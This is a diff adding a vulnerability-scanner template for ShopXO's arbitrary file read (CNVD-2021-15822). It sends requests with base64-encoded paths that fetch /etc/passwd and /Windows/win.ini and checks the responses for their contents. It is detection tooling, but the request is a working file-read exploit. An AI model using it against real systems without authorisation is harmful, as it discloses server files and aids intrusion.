@@ -1,0 +1,26 @@
+id: shopxo-cnvd-2021-15822
+
+info:
+    name: shopxo-cnvd-2021-15822
+    author: Print1n(http://print1n.top)
+    severity: high
+
+manual: true
+transport: http
+rules:
+    Linux0:
+        request:
+            cache: true
+            method: GET
+            path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
+            follow_redirects: false
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    Windows0:
+        request:
+            cache: true
+            method: GET
+            path: /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"extensions") && response.body.bcontains(b"for 16-bit app support")
+expression: Linux0() || Windows0()
+
